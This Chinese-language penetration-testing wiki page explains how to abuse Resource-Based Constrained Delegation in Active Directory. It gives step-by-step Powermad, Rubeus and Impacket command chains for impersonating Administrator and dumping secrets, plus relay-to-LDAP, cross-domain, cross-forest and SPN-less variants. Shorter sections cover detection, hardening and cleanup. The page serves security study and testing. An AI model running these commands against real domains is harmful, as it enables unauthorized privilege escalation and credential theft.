# 基于资源的约束委派

{{#include ../../banners/hacktricks-training.md}}


## 基于资源的约束委派基础

基于资源的约束委派（RBCD）与[约束委派](constrained-delegation.md)类似，但信任方向相反。传统约束委派记录主体可以委派到哪些服务；RBCD 则在**目标资源**上记录哪些主体可以代表用户向其进行身份模拟。<sup>[[12]](#references)</sup>

目标对象的 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ 属性包含一个安全描述符，用于标识获准代表其他身份访问该资源的主体。

另一个重要区别是，拥有对**机器帐户**的足够**写入权限**（`GenericAll`、`GenericWrite`、`WriteDacl`、`WriteProperty` 及类似权限）的主体，可能能够设置 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_。配置传统约束委派通常需要更高权限的管理访问权限。<sup>[[1]](#references)</sup>

更准确地说，修改经典约束委派设置通常需要在域控制器上拥有 `SeEnableDelegationPrivilege`，而这项权限通常由高权限管理员持有。RBCD 将决策权交给目标对象的安全描述符，因此，对相关计算机对象属性拥有写入权限，就可能足够，而不需要该用户权限。<sup>[[1]](#references)[[2]](#references)</sup>

### 新概念

`userAccountControl` 中的 **`TrustedToAuthForDelegation`** 标志通常被描述为 **S4U2Self** 的先决条件，但这并不完整。\
拥有 SPN 的服务主体无需该标志即可请求 S4U2Self。启用 `TrustedToAuthForDelegation` 时，返回的服务票据是**可转发的**；未启用时，该票据通常**不可转发**。<sup>[[5]](#references)</sup>

传统约束委派会在 S4U2Proxy 步骤拒绝**不可转发的 TGS**。如果目标的安全描述符授权了请求服务，RBCD 则可以接受该 S4U2Self 票据。<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### 攻击结构

> 如果你对**计算机帐户**拥有**等效写入权限**，就可能获得对该计算机的特权访问。

假设攻击者已经对受害者计算机对象拥有**等效写入权限**。

1. 攻击者**攻陷**一个拥有 **SPN** 的帐户，或**创建一个**此类帐户（“Service A”）。默认情况下，经过身份验证的域用户最多可以创建 10 个计算机对象，具体由 **_MachineAccountQuota_** 控制；计算机对象会自动提供可用的 SPN。
2. 攻击者**滥用其对受害者计算机（ServiceB）的 WRITE 权限**，配置**基于资源的约束委派，使 ServiceA 能够针对该受害者计算机（ServiceB）模拟任意用户**。
3. 攻击者使用 Rubeus 从 Service A 向 Service B 执行**完整的 S4U 攻击**（S4U2Self 和 S4U2Proxy），目标用户是一个**对 Service B 拥有特权访问权限**的用户。
   1. S4U2Self（使用被攻陷或创建的 SPN 帐户）：请求一个**代表 Administrator、发往 Service A 的 TGS**（不可转发）。
   2. S4U2Proxy：使用该**不可转发的 TGS**，请求一张代表 **Administrator**、发往**受害者主机**的服务票据。
   3. 在此 RBCD 流程中，不可转发的票据仍可能有效，因为 Service A 已获准列入目标资源的安全描述符。
4. 攻击者可以使用 **pass-the-ticket** 并**模拟**该用户，以获得对受害者 ServiceB 的**访问权限**。<sup>[[1]](#references)</sup>

`MachineAccountQuota=0` 会关闭默认的计算机创建途径，但不会移除对目标计算机对象的写入权限，也不会影响对现有帐户的控制。没有 SPN 的受控普通用户，有时也可以通过 [SPN-less U2U method](#spn-less-cross-domain--cross-forest-rbcd) 作为委派主体使用，包括在同一域内。此途径仍需要有效的 RBCD 写入权限、对委派用户凭据的控制、可委派的被模拟身份、兼容的 Kerberos 加密行为，以及会干扰帐户的 NT 哈希更改。应将这些视为彼此独立的先决条件；RBCD 属性为空或配额为零，都不能单独证明攻击成功或系统安全。

现有的 RBCD 描述符也可以指定一个**组**，而不是直接指定委派计算机。如果你控制一个带 SPN 的计算机帐户，并且能够将其添加到该组，新的组成员关系就可能提供委派路径，而无需更改目标计算机的 RBCD 属性。在判断该路径是否可行之前，应检查该组有效的成员写入 ACL（包括 deny ACE）、嵌套成员关系和令牌刷新、描述符中的受托者 SID、被模拟帐户的委派限制，以及目标服务 SPN。

你可以使用以下命令检查域的 _**MachineAccountQuota**_：

```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## 攻击

### 创建计算机对象

你可以使用 **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup> 在域内创建计算机对象。

```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```

### 配置基于资源的约束委派

**使用 Active Directory PowerShell 模块**<sup>[[4]](#references)</sup>

```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```

**使用 powerview**<sup>[[3]](#references)</sup>

```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

### 执行完整的 S4U 攻击（Windows/Rubeus）

首先，我们使用密码 `123456` 创建了新的计算机对象，因此需要获取该密码的 hash：<sup>[[3]](#references)[[4]](#references)</sup>

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

这将打印该账户的 RC4 和 AES 哈希。\
现在可以执行攻击：<sup>[[3]](#references)[[4]](#references)</sup>

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

只需使用 Rubeus 的 `/altservice` 参数询问一次，就能为更多服务生成更多票据：

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

> [!CAUTION]
> 用户可以被标记为 **“账户敏感，无法委派。”** 启用此标志后，无法通过此委派流程冒充该账户。BloodHound 会在分析期间显示此属性。

### Linux 工具：使用 Impacket 实现端到端 RBCD（2024 年及以后）

如果你在 Linux 环境中操作，可以使用官方 Impacket 工具完成完整的 RBCD 攻击链：<sup>[[6]](#references)[[7]](#references)</sup>

```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```

注记
- 如果强制要求 LDAP signing/LDAPS，请使用 `impacket-rbcd -use-ldaps ...`。
- 优先使用 AES keys；许多现代域会限制 RC4。Impacket 和 Rubeus 都支持仅使用 AES 的流程。
- Impacket 可以为某些工具重写 `sname`（“AnySPN”），但应尽可能获取正确的 SPN（例如 CIFS/LDAP/HTTP/HOST/MSSQLSvc）。

### 面向无 SPN 的 Kerberos-only delegator 的 Reflective RBCD

被攻陷的用户具有 **`msDS-AllowedToDelegateTo`，但没有 SPN 或 `TrustedToAuthForDelegation`**，因此无法通过常规 S4U2Self 生成 [Kerberos-only constrained delegation](constrained-delegation.md#protocol-transition-vs-kerberos-only-constrained-delegation) 所需的 forwardable evidence ticket。<sup>[[1]](#references)[[18]](#references)</sup> 如果该用户能够在其**自身** AD 对象上写入 RBCD，攻击者控制的、带有 SPN 的账户就可以先委派*给该用户*。<sup>[[1]](#references)[[18]](#references)</sup> 这个 RBCD 跳转会为被冒充的用户生成一张发往无 SPN 账户的 forwardable ticket，随后这张票据可作为第二次 S4U2Proxy 的 evidence，目标则是被攻陷账户的经典委派允许列表中的一个 SPN。<sup>[[18]](#references)[[19]](#references)</sup>

对于第一个无 SPN 跳转，helper account 的 S4U2Proxy 请求必须使用 **U2U**：`enc-tkt-in-skey` 会让 KDC 使用 delegator 的 TGT session key 加密票据，而不是查找 SPN key。<sup>[[18]](#references)[[19]](#references)</sup> KDC 还需要 `PA-PAC-OPTIONS` 中的 RBCD 位、delegator 的 TGT，以及 S4U2Self evidence ticket。<sup>[[18]](#references)[[20]](#references)</sup> 作者的 Impacket `getST.py` fork 为此请求添加了 `-nospn` 和 `-tgt`；`-nospn`/`-tgt` 支持已包含在上游 Impacket PR #2324 中，因此此步骤应使用链接的 fork，而不要假定 stock `getST.py` 支持该功能。<sup>[[18]](#references)[[20]](#references)</sup>

此示例假设 `svc_web` 已被攻陷、可以写入自身的 RBCD 属性，并且获准委派到 `host/dc01.corp.local`。此外还假设可以创建带 SPN 的 helper、允许使用 RC4，且所选的 `Administrator` 可被委派。使用被攻陷账户的 NT hash 请求一个 **RC4 TGT**。使用作者的 fork 运行第一个 `getST.py`；检查 `describeTicket.py` 的输出，并将其中的 **RC4 TGT session key** 填入下方命令。最后一个 `getST.py` 可以使用 stock Impacket。务必在更改 NT hash **之前**请求 TGT；更改 hash 会导致该服务账户无法正常工作，直到重置其密码。<sup>[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

```bash
pypykatz crypto nt 'OldPass!'
getTGT.py -hashes ':<CURRENT_NT_HASH>' 'corp.local/svc_web' -dc-ip 10.0.0.10
describeTicket.py svc_web.ccache
addcomputer.py -computer-name 'HELPER$' -computer-pass 'HelperPass!' -dc-ip 10.0.0.10 'corp.local/svc_web:OldPass!'
rbcd.py -delegate-from 'HELPER$' -delegate-to svc_web -action write -dc-ip 10.0.0.10 'corp.local/svc_web:OldPass!'
changepasswd.py 'corp.local/svc_web:OldPass!@10.0.0.10' -newhashes ':<RC4_TGT_SESSION_KEY>'
python3 ./getST.py -u2u -impersonate Administrator -nospn svc_web -tgt svc_web.ccache -dc-ip 10.0.0.10 'corp.local/HELPER$:HelperPass!'
KRB5CCNAME=svc_web.ccache impacket-getST -impersonate Administrator -spn host/dc01.corp.local -additional-ticket 'Administrator@svc_web@CORP.LOCAL.ccache' -k -no-pass -dc-ip 10.0.0.10 'corp.local/svc_web'
```

与下面的 [SPN-less RBCD 路径](#spn-less-cross-domain--cross-forest-rbcd)不同，这条链会先将 SPN-less 账户用作 **RBCD 目标**，再将其用作**经典 KCD 委派方**。它仍需要另一个受控的、带有 SPN 的账户。如果 `MachineAccountQuota=0`，已控制的 SPN 账户可以替代新建的计算机；仅配额为零并不会阻止这条路径。<sup>[[18]](#references)[[19]](#references)</sup>

## 跨域与跨林 RBCD

如果你控制的**委派主体**位于**不同的域**（甚至是**不同的林**），而**资源计算机**位于另一个域或林中，这种滥用仍然属于 **RBCD**，但票据流程不再是常见的单域 `S4U2Self -> S4U2Proxy`。

### 跨域 RBCD：通过 SID 配置外部主体

当你从**不同的域**设置 `msDS-AllowedToActOnBehalfOfOtherIdentity` 时，目标域 LDAP 可能**无法通过名称解析**外部计算机/用户。在这种情况下，请使用外部主体的 **SID** 配置委派条目，而不要使用其 sAMAccountName/UPN。

使用 `ntlmrelayx.py` 将 NTLM 中继到 LDAP 时，这一点尤其重要：<sup>[[9]](#references)</sup>

```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
  --no-dump --no-da --no-validate-privs \
  --delegate-access \
  --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
  --sid
```

注意：
- `--sid` 会告诉 `ntlmrelayx.py` 将 `--escalate-user` 视为 SID；当委派账户属于目标域以外的域时，这是必需的。
- 即使工具显示 `User not found in LDAP`，委派写入仍可能成功，因为安全描述符会直接存储外部 SID。

### 跨域 RBCD：跨 realm S4U 流程

将外部主体添加到 `msDS-AllowedToActOnBehalfOfOtherIdentity` 后，可用的跨域流程如下：<sup>[[9]](#references)[[13]](#references)</sup>

1. 从委派主体所属的域获取 **TGT**。
2. 请求 `krbtgt/<target-domain>` 的 **referral TGT**。
3. 在目标域 DC 上，为被冒充的用户请求 **cross-realm S4U2Self referral**。
4. 回到委派方域，为该用户请求实际的 **S4U2Self** 票据。
5. 在委派方域执行 **S4U2Proxy**，获取目标域的 referral 票据。
6. 在目标域 DC 上执行最后一次 **S4U2Proxy**，获取 `cifs/host.target`、`host/host.target` 等服务的服务票据。

这就是 stock Linux 工具经常无法处理跨域 RBCD 的原因：<sup>[[9]](#references)</sup>
- 请求的 **realm** 可能需要与 `TGS-REQ` 中所用 TGT 的 realm 不同
- 该流程需要**独立的 S4U2Proxy 步骤**，而不只是执行 `S4U2Self`，或在 `S4U2Self` 后立即执行一次 `S4U2Proxy`

### 从 Linux 执行跨域 RBCD

Synacktiv 发布了一个 Impacket `getST.py` 实现，通过显式处理两个 KDC，在 Linux 上复现跨 realm 流程：<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
  -dc-ip 192.168.90.131 \
  -targetdc 192.168.90.217 \
  -targetdomain asgard.local \
  -impersonate thor_adm \
  -spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
  ./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
  -k -no-pass -dc-ip 192.168.90.217
```

在实际操作中，新增的参数如下：
- `-dc-ip`：**委派**域的 DC
- `-targetdomain`：**资源计算机**所属的域
- `-targetdc`：**资源**域的 DC

### 跨林 RBCD 的限制

跨林 RBCD 有一个重要限制：**被冒充的用户必须属于与委派主体相同的林**。换句话说，如果你控制的机器账户位于 `valhalla.local`，而目标资源位于 `asgard.local`，通常**无法**通过 RBCD 冒充任意 `asgard.local` 用户访问该资源。<sup>[[9]](#references)</sup>

以下情况仍可利用：
- **委派林**中的用户是另一林资源主机上的**本地管理员**（或拥有其他特权）
- 信任关系允许所需的身份验证路径，且目标计算机的安全描述符接受外部 SID

### 跨林 RBCD 协议中的特殊情况

跨林 RBCD 并不只是“跨域加上信任关系”。观察到的流程中有两个特殊情况，常见工具过去经常会遗漏：<sup>[[9]](#references)</sup>

1. 需要额外发送一个设置了 **`PA-PAC-OPTIONS=branch-aware`** 的 **S4U2Proxy** 请求
2. 即使请求了其他 etype，最终服务票据也可能以 **RC4** 返回

实际流程如下：

1. 获取林 A 中委派主体的 TGT。
2. 在林 A 中为被冒充的用户请求 **S4U2Self**。
3. 在林 A 中请求 **S4U2Proxy**，以获取林 B 的 referral TGT。
4. 在林 A 中发送第二个 **S4U2Proxy** 请求，**不**将 S4U2Self 票据作为附加票据，但启用 `branch-aware`，以获取另一个林 B 的 referral TGT。
5. 可选：在林 B 中为委派主体请求一个普通服务票据（最终利用不需要此票据）。
6. 使用步骤 3 和 4 中的 referral 票据，在林 B 中请求最终的 **S4U2Proxy** 票据，将林 A 中被冒充的用户映射到目标 SPN。

### 从 Linux 执行跨林 RBCD

Synacktiv 的同一 Impacket 分支为此逻辑添加了 `-forest` 开关：<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
  -impersonate 'v_thor' \
  -dc-ip VALHALLA.local \
  valhalla.local/'desktop$' \
  -targetdc ASGARD.local \
  -targetdomain asgard.local \
  -aesKey 4[...]f \
  -forest
```

### 递归多域 RBCD（3 个或更多域）

在**多域林**中，**S4U2Self** 和 **S4U2Proxy** 都可以**递归执行**，而不是在一次 referral 后停止：

- **递归 S4U2Self**：第一个 `S4U2Self` 会发送到**被模拟用户所在的域**，然后通过针对 `krbtgt/<REALM>` 的普通 `TGS-REQ` referral 遍历中间的父子域，最后一个 `S4U2Self` 则发送到**委派主体自己的域**。
- 这意味着，**只持有**机器账户的 **TGT**，就可能足以模拟同一林中另一域的**管理员**，并请求 `cifs/host`、`host/host`、`wsman/host` 等服务。
- **递归 S4U2Proxy** 会以相同方式沿信任链传递：中间跳会将上一个票据作为 TGT 重用，同时请求下一个 `krbtgt/<REALM>` referral；只有最后一跳会返回最终服务票据。<sup>[[10]](#references)</sup>

一个实际的同林示例如下：

```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
  -impersonate Administrator@frperso.local -self \
  -altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
  smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```

### SPN-less 跨域 / 跨 forest RBCD

如果**委派主体是没有 SPN 的用户**，最后一次递归 `S4U2Self` 会失败并返回 **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**。解决方法是**仅将最后一跳重试为 `S4U2Self+U2U`**。<sup>[[10]](#references)</sup>

滥用链简述：

1. 使用 **NT hash** 进行身份验证，促使 KDC 使用 **RC4-HMAC (etype 23)**。
2. 先请求 **`-self -u2u`**，并将该票据与后续的 proxy 步骤分开保存。
3. 使用 `describeTicket.py` 提取 **TGT session key**。
4. 使用 `changepasswd.py -newhashes <session_key>`，将用户的 **NT hash** 替换为该 **session key**。
5. 在单独的 **`-proxy`** 请求中，将 `S4U2Self+U2U` 票据作为 **`-additional-ticket`** 使用。

```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
  -impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
  -hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
  -impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
  -spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```

Operational caveats:

- 当**第一个受信任跳点已经是另一个 forest** 时，优先使用 **branch-aware** 算法（`getST.py ... -forest`），以匹配 Windows 原生行为。如果链路中较晚才到达 foreign forest，非 branch-aware 的递归流程仍可能有效。<sup>[[9]](#references)</sup>
- 在较新的 **Windows Server 2022/2025** DC 上，强制使用 RC4 可能因 RC4 弃用而失败，并返回 **`KDC_ERR_ETYPE_NOSUPP`**；这可能导致 **SPN-less RBCD 无法使用**，尽管基于经典 SPN 的 RBCD 仍可使用 AES。<sup>[[15]](#references)</sup>
- 在更改用户的 hash/password 之前，先运行 **`S4U2Self+U2U`**：**`SamrChangePasswordUser`** 不会重新计算账户的 Kerberos AES keys，因此先更改密码可能会导致后续票据请求失败。<sup>[[14]](#references)</sup>
- 被 impersonate 的账户仍必须允许 delegation：**Protected Users** 以及带有 **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** 设置的账户会阻断该链路。

## Detection / hardening notes

- 跨 domain/forest 的 RBCD 路径通常仍通过 **ACL abuse** 或 **relay-to-LDAP** 建立。在 DC 上强制启用 **LDAP signing** 和 **LDAP channel binding**，以阻断常见的建立路径。
- 审计哪些主体可以在 computer objects 上写入 `msDS-AllowedToActOnBehalfOfOtherIdentity`，并解析其中存储的 SIDs，包括 **foreign security principals**。
- 在 trust 密集的环境中，检查 **Selective Authentication**、**SID filtering**，以及来自 foreign forest 的用户是否在资源主机上拥有 **local admin** 权限。

### Accessing

最后一条命令行会执行**完整的 S4U attack**，并在**内存**中将从 Administrator 到受害主机的 TGS 注入。\
在此示例中，请求的是 Administrator 的 **CIFS** 服务 TGS，因此你将能够访问 **C$**：

```bash
ls \\victim.domain.local\C$
```

### 滥用不同的服务票据

了解[**此处提供的服务票据**](silver-ticket.md#available-services)。

## 枚举、审计和清理

### 枚举配置了 RBCD 的计算机

PowerShell（解码 SD 以解析 SID）：

```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  ForEach-Object {
    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
    $sd.DiscretionaryAcl | ForEach-Object {
      $sid  = $_.SecurityIdentifier
      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
    }
  }
```

Impacket（用一条命令读取或刷新）：

```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```

### 清理 / 重置 RBCD

- PowerShell（清除该属性）：

```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```

- Impacket:

```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```

## Kerberos 错误

- **`KDC_ERR_ETYPE_NOTSUPP`**：这表示 Kerberos 配置为不使用 DES 或 RC4，而你只提供了 RC4 hash。至少向 Rubeus 提供 AES256 hash（或同时提供 rc4、aes128 和 aes256 hashes）。示例：`[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- 普通用户执行 `-self` 时出现 **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**：委派 principal 可能**没有 SPN**。请将**最后一跳**改为 **`S4U2Self+U2U`**，而不是常规的 `S4U2Self`。<sup>[[10]](#references)</sup>
- **无 SPN 的 RBCD**期间出现 **`KDC_ERR_ETYPE_NOSUPP`**：较新的 DC 可能会拒绝 `S4U2Self+U2U` + session-key-substitution 技巧所需的强制 **RC4-HMAC** 路径。请改用基于 SPN 的经典 **RBCD** 路径，并使用 AES。<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**：这表示当前计算机的时间与 DC 的时间不同，因此 Kerberos 无法正常工作。
- **`preauth_failed`**：这表示给定的用户名和 hashes 无法用于登录。生成 hashes 时可能忘记在用户名中加入 `"$"`（`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`）
- S4U2Proxy 期间出现 **`KDC_ERR_BADOPTION`**：检查被冒充账户的委派限制、证据票据的 forwardable 标志，以及经典 KCD 或目标的 RBCD descriptor 是否授权了此跳转。这是 **KDC 委派策略错误**，并不能用于测试目标服务是否正在运行，也不能用于测试用户是否拥有应用层访问权限。目标 SPN 未注册时，通常会出现 **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**。<sup>[[21]](#references)[[22]](#references)</sup>

## 备注、中继与替代方案

- 如果 LDAP 被过滤，你也可以通过 AD Web Services (ADWS) 写入 RBCD SD。参见：


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay 链常以 RBCD 结束，从而一步实现本地 SYSTEM。参见端到端实战示例：


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- 如果 **LDAP signing/channel binding 已禁用**，且你可以创建 machine account，KrbRelayUp 等工具可以将被强制触发的 Kerberos auth relay 到 LDAP，为目标计算机对象上的 machine account 设置 `msDS-AllowedToActOnBehalfOfOtherIdentity`，然后通过 S4U 从非目标主机立即冒充 **Administrator**。<sup>[[8]](#references)</sup>

## References

- [1] [《牵狗之术：滥用基于资源的约束委派攻击 Active Directory》](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [《关于委派的另一点说明》– harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [《Kerberos 基于资源的约束委派：计算机对象接管》](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix –《滥用基于资源的约束委派》](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [《Kerberosity 扼杀了域：Kerberos 攻击概述》](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py（官方）](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [《近期语法的 Linux 快速备忘单》](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno（关闭 LDAP signing → Kerberos relay 到 RBCD）](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv -《探索跨域和跨林 RBCD》](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv -《探索跨域和跨林 RBCD：第 2 部分》](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket 分支 - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn -《Kerberos 约束委派概述》](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications -《跨域 S4U2Self》](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications -《SamrChangePasswordUser》](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn -《检测并修复 Kerberos 中的 RC4 使用情况》](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications –《S4U2Proxy 详情》](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
- [17] [James Forshaw -《使用普通用户账户利用 RBCD》](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)
- [18] [Hunter Wade -《针对无 SPN 账户，在不使用协议转换的情况下滥用约束委派》](https://hunio.org/security/abusing-constrained-delegation-without-protocol-transition-against-spn-less-accounts/)
- [19] [Sprocket Security -《针对无 SPN 账户，在不使用协议转换的情况下滥用约束委派》](https://www.sprocketsecurity.com/blog/abusing-constrained-delegation-without-protocol-transition-against-spn-less-accounts)
- [20] [Impacket PR #2324 -《使用 U2U 的 S4U2Proxy》](https://github.com/fortra/impacket/pull/2324)
- [21] [Microsoft MS-SFU -《使用 ServicesAllowedToSendForwardedTicketsTo》](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/6d76bf10-3c48-4e14-9992-df1bd456455e)
- [22] [Microsoft Learn -《启用 Kerberos 事件日志记录》](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/enable-kerberos-event-logging)
{{#include ../../banners/hacktricks-training.md}}
